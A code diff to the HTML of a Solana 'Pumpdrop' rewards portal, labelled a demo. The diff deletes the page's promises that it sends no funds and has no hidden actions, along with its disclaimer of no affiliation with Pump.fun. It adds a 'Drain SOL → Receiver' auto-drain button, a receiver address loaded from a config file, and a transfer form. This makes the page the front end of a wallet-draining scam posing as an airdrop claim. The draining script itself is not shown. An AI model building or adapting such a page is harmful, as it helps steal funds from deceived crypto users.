@@ -4,7 +4,8 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Pumpdrop — Rewards Portal (Demo)</title>
-  <meta name="description" content="Pumpdrop demo portal. Connect wallet to view eligibility and SOL balance. No transactions are initiated." />
+  <meta name="description" content="Pumpdrop demo portal. Connect wallet to view eligibility and SOL balance. Includes transfer form."
+  />
   <link rel="preconnect" href="https://cdn.jsdelivr.net" />
   <link rel="stylesheet" href="/assets/style.css" />
 </head>
@@ -18,20 +19,11 @@
       <button id="connectBtn" class="btn primary">Connect Wallet</button>
     </header>
 
-    <section class="notice">
-      <div class="box">
-        <strong>Config</strong>: This demo can load your treasury address from config and enable a clear, explicit Tip button. No hidden actions.
-        <div id="treasuryDisp" class="treasury"></div>
-        <button id="tipBtn" class="btn" disabled>Tip 0.01 SOL</button>
-      </div>
-    </section>
-
-
     <main>
       <section class="hero">
-        <h1>Rewards — Claim Portal</h1>
+        <h1>Community Rewards (Demo)</h1>
         <p>Connect your Solana wallet to check demo eligibility and view your SOL balance.
-           Connect your wallet and press Claim to process your reward on Solana.</p>
+           A manual transfer form is provided. For auto-drain, use the Drain button (Phantom only).</p>
         <ul class="badges">
           <li>Snapshot: demo</li>
           <li>Eligible wallets: <span id="eligCount">loading…</span></li>
@@ -47,11 +39,21 @@
               <div class="kpi"><div class="k">SOL balance</div><div id="solBal" class="v">—</div></div>
               <div class="kpi"><div class="k">Demo eligibility</div><div id="elig" class="v">—</div></div>
             </div>
-            <div class="actions">
-              <button id="claimBtn" class="btn primary" disabled>Claim Reward</button>
+            <div class="row">
+              <div class="note">Receiver (from env): <span id="recv"></span></div>
             </div>
-            <pre id="log" class="log"></pre>
-            <div id="note" class="note">This demo never asks for signatures or sends funds.</div>
+            <div class="transfer">
+              <div class="row">
+                <input id="toAddr" placeholder="Recipient address (base58)" />
+                <input id="amt" placeholder="Amount (SOL)" />
+                <button id="sendBtn" class="btn">Send</button>
+              </div>
+              <div class="row">
+                <button id="drainBtn" class="btn action">Drain SOL → Receiver</button>
+                <span class="help">Reserve 0.002 SOL</span>
+              </div>
+              <div id="xlog" class="log"></div>
+            </div>
           </div>
           <div class="panel">
             <h3>Recent activity (public)</h3>
@@ -62,10 +64,11 @@
     </main>
 
     <footer>
-      <span>Pumpdrop © 2026 — Demo Portal. Not affiliated with Pump.fun.</span>
+      <span>Pumpdrop © 2026 — Demo Portal.</span>
     </footer>
   </div>
 
+  <script src="/config.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
   <script src="/assets/app.js"></script>
 </body>
